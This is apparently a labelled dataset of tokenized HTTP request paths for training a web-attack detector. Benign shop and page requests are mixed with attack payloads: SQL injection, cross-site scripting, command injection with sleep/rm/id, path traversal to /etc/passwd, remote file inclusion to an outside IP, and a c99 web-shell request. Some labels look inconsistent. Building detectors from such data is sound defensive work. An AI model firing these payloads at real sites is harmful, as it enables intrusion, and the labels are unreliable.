request	label
/ string / strings / parameters = espuna 	0
/ 758925 / 	0
/ ru_lang / 	0
"/ help . php ? q =  "" del q85487167 & rem "	1
/ oneadmin / adminfoot . php ? path [ docroot ]  = xxpathxx 	1
"/ string / strings / parameters = < html onmousedown html onmousedown =  "" javascript : javascript : alert ( 1 )  ""  >  <  / html onmousedown > "	1
/ webkatalogverzeichnis-a / 	0
/ string / strings / parameters = 1 '  )  as tqdg where 9355 = 9355 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  # 	1
"/ main . php ? logout =  ""  & ver & rem "	1
"/ main . php ? logout =  ""  & ping ; -w ; 8000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; "	1
/ string / modo = entrar & login = deng-jyi & pwd = cegr ,  & remember = on & b1 = entrar 	1
/ string / strings / parameters = &  # x000003e 	1
/ string / strings / parameters = fnico 	0
/ ny1b3qq4 . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = & echo anykuw $  (  ( 28 + 42 )  )  $  ( echo anykuw ) anykuw & 	1
"/ hipkz026 . htm ?  < script > document . cookie =  "" testyrbs = 2855 ;  ""  <  / script > "	1
"/ help . php ? q =  ""  & ver \ x09 > q37118447 & rem \ x09 "	1
/ 149031 / 	0
/ string / strings / parameters = &  # 00062 	1
/ main . php ? stuff = ver \ x0b > q55597274 & rem \ x0b 	1
/ string / strings / parameters = 1 %  '  and  ( 3020 = 3020 )  * 6703 and  '  %  '  =  ' 	1
/ liithappened / 	0
/ 039533 / 	0
/ string / strings / parameters = gorse @ 16horas . yu 	0
/ string / strings / parameters = 1 )  or 8514 = benchmark ( 5000000 , md5 ( 0x544d5a4c )  )  # 	1
/ string / strings / parameters = 1 )  )  )  and  ( 6148 = 3343 )  * 3343 and  (  (  ( 3271 = 3271 	1
/ recordings / pjreview_neo . cgi ? p =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ netget ? sid = user & msg = 300 & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini 	1
/ 202480980042b0682127658 / 	0
/ string / strings / parameters = carrer asturies ,  49 	0
/ modem-spamqa2 / 	0
/ string / id = 1 & nombre = ques + o + manchego & precio = 39 & cantidad = 94 & b1 = aadir + al + carrito 	1
/ javascript / hipaa . meta 	0
/ a one dvd to mp3 ripper v4 / 	0
/ string / strings / parameters = 5388028127449105 	0
/ i5specificationcalc / 	0
/ javascript / read . tpl 	0
/ javascript / clear . as 	0
/ string / id = 2 & nombre = queso + manchego & precio = 100 /  & cantidad = 84 & b1 = aadir + al + carrito 	1
"/ string / strings / parameters = "" echo mjejve $  (  ( 54 + 9 )  )  $  ( echo mjejve ) mjejve ' "	1
/ string / modo = registro & login = pardo & password = s2r44n9sa & nombre = julius & apellidos = abad + palomo & email = alonzo @ colorprint . eh & dni = 44696230p & direccion = pl .  + primero + de + mayo + s / n ,  + 11f & ciudad = albal & cpa = 29493 & provincia = soria & ntc = 1165920681066048 & b1 = registrar 	1
/ msik7n2g / 	0
/ string / modo = entrar & login = lepine & pwd = crioja & remember = off & b1 = entrar 	0
/ main . php ? logout =  '  \ x0ddel q42494852  # 	1
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \  .  .  \  .  .  \  .  .  \  { file } 	1
/ 587183 / 	0
"/ string / strings / parameters = < a href =  ""  \ x01javascript : javascript : alert ( 1 )  ""  id =  "" fuzzelement1 ""  > test <  / a > "	1
/ string / modo = insertar & precio = 8721 & b1 = confirmar 	0
/ javascript / statistic . error 	0
"/ main . php ? stuff =  ""  & rm ; q68954445 & rem ; "	1
/ n9xlumt5 . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ lpd-doc / 	0
/ 170504 / 	0
/ string / strings / parameters = he82 	0
/ 150950 / 	0
/ 049203 / 	0
/ flamingomirrordeco / 	0
"/ string / strings / parameters = ""  echo fpjhyx $  (  ( 59 + 74 )  )  $  ( echo fpjhyx ) fpjhyx ' "	1
/ admin / st_countries . php ? include_path = xxpathxx ? 	1
/ index . php ? op = viewarticle & articleid = 9999 /  *  *  / union /  *  *  / select /  *  *  / 1331908730 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	0
/ string / modo = registro & login = japan & password = d37t30 & nombre = alejo & apellidos = nadeix + laumann & email = kuneva_germaine @ ajuntamentdebcn2-0 . cy & dni = 44923287d & direccion = calle + mestre + chapi + 48 ,  +  & ciudad = vilaller & cp = 28609 & provincia = tarragona & ntc = 5277423827718841 & b1 = registrar 	0
/ string / strings / parameters = 1 )  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  ( 9932 = 9932 	1
/ string / strings / parameters = '  & echo ncnrpj $  (  ( 94 + 40 )  )  $  ( echo ncnrpj ) ncnrpj | 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo ztqvnm )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  ' "	1
/ svutukuri / 	0
/ string / str =  $  ( echo gqpjfy )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ rfid_cpg / 	0
/ string / strings / parameters = 822rrac106 	0
/ 129010 / 	0
/ string / id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 68 & b1 = aadir + al + carrito 	0
/ 548510 / 	0
/ string / strings / parameters = t2591151 	0
/ ultraaviconverter / 	0
/ 374202 / 	0
/ phpmyadmin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331923189 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 	1
/ string / strings / parameters = < style > p [ foo = bar {  }  *  { -o-link :  ' javascript : javascript : alert ( 1 )  '  }  {  }  *  { -o-link-source : current }  ]  { color : red }  ;  <  / style > 	1
/ w32sdbotaeb / 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  ; ls + -l ; rm +  / tmp / fppatbfqdp "" "	1
/ string / modo = entrar & login = elsa & pwd = permanecer & remember = off & b1 = entrarany ?   set-cookie :  + tamper = 1041264011025374727 	1
/ help . php ? q = ver \ x0c > q98299135 & rem \ x0c 	1
/ javascript / resolve . cc 	0
/ sb116585916836646632 / 	0
/ string / strings / parameters = vaciar carrito 	0
/ spatialtemporal / 	0
"/ help . php ? q =  "" ver \ xa0 > q88986355 & rem \ xa0 "	1
/ 453967 / 	0
"/ string / strings / parameters = < object data =  "" http :  /  / corkami . googlecode . com / svn /  ! svn / bc / 480 / trunk / misc / pdf / helloworld_js_x . pdf ""  > "	1
/ string / strings / parameters = 1 '  )  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  (  ' qutm '  =  ' qutm 	1
/ string / strings / parameters = 9270844246904218 	0
/ string / strings / parameters = ;  str =  $  ( echo ytykpd )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ string / strings / parameters = sabiela 	0
/ main . php ? logout =  ' rm \ x09q76232693 \ x09 # 	1
/ prodlist . asp ? brand =  < script > alert ( 414555596928 )  ;  <  / script > 	1
"/ jw64yq8u . x ?  < meta http-equiv = set-cookie content =  "" testylfu = 1313 ""  > "	1
"/ string / strings / parameters = < div id =  "" 109 ""  >  < svg xmlns =  "" http :  /  / www . w3 . org / 2000 / svg ""  > "	1
"/ bxnyrhmh . aspx ?  < script > document . cookie =  "" testmjct = 1867 ;  ""  <  / script > "	1
/ string / id = 3any  set-cookie :  + tamper = 5765205567234876235 & nombre = vino + rioja & precio = 39 & cantidad = 40 & b1 = aadir + al + carrito 	1
/ string / id = 1 & nombre = vino +  .  *  ? rioja & precio = 100 & cantidad = 48 & b1 = aadir + al + carrito 	1
"/ string / strings / parameters = ""  |  | echo sycjec $  (  ( 69 + 95 )  )  $  ( echo sycjec ) sycjec "" "	1
/ cgi-bin / index . php ? edit = nonexistant1359826429 	0
/ michael / 	0
/ home_tech / 	0
/ javascript / me . exe 	1
/ string / strings / parameters = -9098 '  union all select 3476 , 3476 , 3476 , 3476 , 3476 , 3476 # 	1
/ examples / jsp / jsp2 / el / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ javascript / certificate . log 	0
/ string / strings / parameters = |   [  3 -ne  $  ( echo tseufd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ 10330184 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  union all select null , null , null , null , null , null , null , null , null , null -- "	1
/ module-ftplib / 	0
/ string / strings / parameters = monelli @ carimartin . gd 	0
/ string / strings / parameters = doralie 	0
/ string / modo = registro & login = charles2 & password = b8z7 & nombre = rufo & apellidos = gusmerini + aguado & email = firshman @ softwaresaas . gn & dni = 11831280b & direccion = ferreries + 141 ,  + 9d & ciudad = manza ? nares & cp = 41820 & provincia = lleida & ntc = 8924971122572186 & b1 = registrar 	1
/ lisa ann ' s anal scene - ass cleavage 8 / 	1
/ string / strings / parameters = edilio 	0
/ 1894282427 / 	0
/ 5990-6719 / 	0
/ microcontroller-faq / 	0
/ string / strings / parameters = '  |   [  9 -ne  $  ( echo fmcmjn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ dnsworks / 	0
/ javascript / programming . tmp 	0
/ javascript / j2ee . cpp 	0
/ 112188 / 	0
/ string / strings / parameters = -8370 '  )  )  or  ( 3501 = 6407 )  * 6407 and  (  (  ' agcm '  like  ' agcm 	1
/ javascript / emails . cnf 	0
/ 353704 / 	0
/ phpmyadmin / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331923195 '  )  <  / script > 	1
/ terrorist_risks / 	0
/ webdav / c99 . php ? act = f & f = wce . exe & ft = info & d = c :  \ 	1
/ components / com_mospray / scripts / admin . php ? basedir = xxpathxx ?  & cmd = id 	1
/ manual / ko / stopping . html 	0
/ string / strings / parameters = |  |  / usr / bin / id ; 	1
/ statshome / 	0
/ cpe / index . php ? repertoire_config = xxpathxx 	1
/ xslt_processors / 	0
/ webtools / bonsai / cvsqueryform . cgi ? cvsroot =  / cvsroot & module =  < script > alert (  ' vulnerable '  )  <  / script >  & branch = head 	1
/ smac_customers / 	0
/ kor_article00220 / 	0
/ examples / jsp / colors / googlesearch / googlesearch . php ? app [ path ]  [ lib ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = .  .  / 	1
/ string / strings / parameters = 15 +  /  *  ! union *  /  +  /  *  ! all *  /  +  /  *  ! select *  /  + 1 , 2 , 3 , 4 , 5 , 6 , 7 -- 	1
/ javascript / labs . ep 	0
/ main . php ? stuff =  '  \ x0drm q65565224  # 	1
/ dievolkerv2 / 	0
/ 4f303b627913 / 	0
/ javascript / comments . exe 	1
/ napster_v3 / 	0
/ javascript / png . exe 	1
/ string / errormsg =  '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
/ cat_mimo / 	0
/ string / modo = entrar & login = padmanab & pwd = 9osquil9a6 & remember = off & b1 = entrar 	0
/ string / id = 3 & nombre = queso + manchego & precio = 85 & cantidad = 62 & b1 = aadir + al + carrito 	0
/ javascript / government . bz2 	0
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919142 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ javascript / android . exe 	1
/ string / strings / parameters = 00660335m 	0
/ javascript / copy . svn-base 	0
/ 44fe0b4511b84010vgnvcm1000004eecbccdrcrd / 	0
/ in-press / 	0
/ string / strings / parameters = < iframe src = http :  /  / test . de > 	1
/ string / strings / parameters = mediona 	0
/ psynch / nph-psa . exe ? css = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	1
"/ v3axg1p8 . fts ?  < script > document . cookie =  "" testxagh = 6987 ;  ""  <  / script > "	1
/ string / strings / parameters = mae 	0
/ article125 / 	0
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad =   & b1 = aadir + al + carrito 	1
"/ gy23xnjq . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = shafiq & password = 4nemmetr6 & nombre = mirko & apellidos = yeste + meloda & email = jones_callas1 @ copiar . com . travel & dni = 91512497m & direccion = c /  + valtravieso + s / n ,  +  & ciudad = villalgordo + del + marquesado & cp = 22533 & provincia = barcelona & ntc = 5170755929650123 & b1 = registrar 	0
/ string / strings / parameters = 1 )  as fnpq where 5209 = 5209 ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual -- 	1
/ a2063251 / 	0
/ javascript / change . exe 	1
/ tabusejersey / 	0
/ string / strings / parameters = '  ) print (  ` echo agbhms echo  $  (  ( 79 + 32 )  )  echo agbhms echo agbhms `  )  ;  )  } agbhms 	1
/ string / strings / parameters = 9a7bl1 	0
/ support_image / 	0
/ geekbdayfront2 / 	0
"/ vac1l5vm . x ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 67445995 / 	0
/ cky - familiar realm by / 	0
/ scripts / weigh_keywords . php ? etcdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	1
/ javascript / sales . htm 	0
/ string / strings / parameters = fullum6 	0
/ upperwest / 	0
/ 001468 / 	0
/ string / strings / parameters = bill 	0
/ string / strings / parameters = 5933 	0
"/ string / a =  ""  "" get ""  ""  ; "	1
/ t7tm4m0b . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ air_assault / 	0
/ top . php ? stuff =  '  \ x0ddel \ x09q88128927 \ x09 # 	1
/ story05 / 	0
/ geek-tips / 	0
/ wolinak / 	0
/ index . php ? abs_path = http :  /  / cirt . net / rfiinc . txt ?  ? 	0
/ string / strings / parameters = &  & echo loakxy $  (  ( 52 + 22 )  )  $  ( echo loakxy ) loakxy & 	1
"/ string / strings / parameters = -9318 ""  ""  )  )  )  union all select 5223 , 5223 , 5223 , 5223 # "	1
/ javascript / reporting . old 	0
/ string / strings / parameters = 8513796211360261 	0
/ javascript / adobe . pl 	0
/ core / aural . php ? site_absolute_path = xxpathxx ?  & cmd = dir 	1
/ main . php ? stuff = uname \ x09 > q57528363 \ x09 # 	1
/ savon-drugstore / 	0
/ dik final cut / 	0
/ examples / jsp / jsp2 / el / bemarket / shop / index . php ? pageurl = viewpage & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ process . php ? host = 192 . 168 . 24 . 152 & time = 300 	0
/ cgi-bin / showproduct . php ? product = 1 ' 	1
"/ string / strings / parameters = 1 ""  ""  )  as sstd where 9629 = 9629 or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  -- "	1
"/ string / strings / parameters = 1 ""  ""  )  )  as xhat where 6674 = 6674 union all select null , null , null # "	1
/ string / strings / parameters = 1 '  where 9156 = 9156 and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
/ examples / jsp / num / config . php ? path [ docroot ]  =  / etc / passwd \ x00 	1
/ lcissues / 	0
/ top . php ? stuff =  '  \ x0arm q53951968  # 	1
"/ string / strings / parameters = 1 %  ""  ""  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ""  ""  %  ""  ""  =  ""  "" "	1
/ javascript / ver1 . sh 	0
/ help . php ? q =  & ver ,  > q86844662 & rem , 	1
/ javascript / trailers . old 	0
/ newscomm3 / 	0
/ string / strings / parameters = ingelber 	0
"/ top . php ? stuff =  "" rm q95826835  # "	1
/ string / strings / parameters = gollu 	0
/ string / strings / parameters = 6612706535332212 	0
"/ string / strings / parameters = ""  |   [  2 -ne  $  ( echo gbbauv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 "	1
"/ bmeun223 . jspa ?  < meta http-equiv = set-cookie content =  "" testhhwu = 7044 ""  > "	1
/ scripts / c32web . exe / getimage ? imagename = customeremail . txt \ x00 . pdf 	1
/ theme / format . php ? _page_css = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  ? 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo grqqci )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' "	1
/ landingpagestudents / 	0
/ examples / jsp / cal / index . php ? include_files [  ]  =  & include_files [ query_string ]  =  / etc / passwd 	1
/ string / strings / parameters = follett 	0
/ ffnav_06 / 	0
/ tocaracedriver3nointrofixall / 	0
/ 200-10658 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual -- "	1
/ sw / lib_user / find_user . php ? doc_directory = xxpathxx ? 	1
/ prisonerofwarnointrofixall / 	0
/ houseofstyle / 	0
"/ ap58k3ci . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ searchnewzcombined / 	0
/ but_com / 	0
"/ lsoix5h3 . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / id = 2 /  & nombre = jamn + ibrico & precio = 100 & cantidad = 6 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = 3376121794389360 	0
/ string / strings / parameters = < div / style = content : url ( data : image / svg + xml )  ; visibility : visible onmouseover = confirm ( 1 )  > mouse over <  / div > 	1
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \  .  .  \  { file } 	1
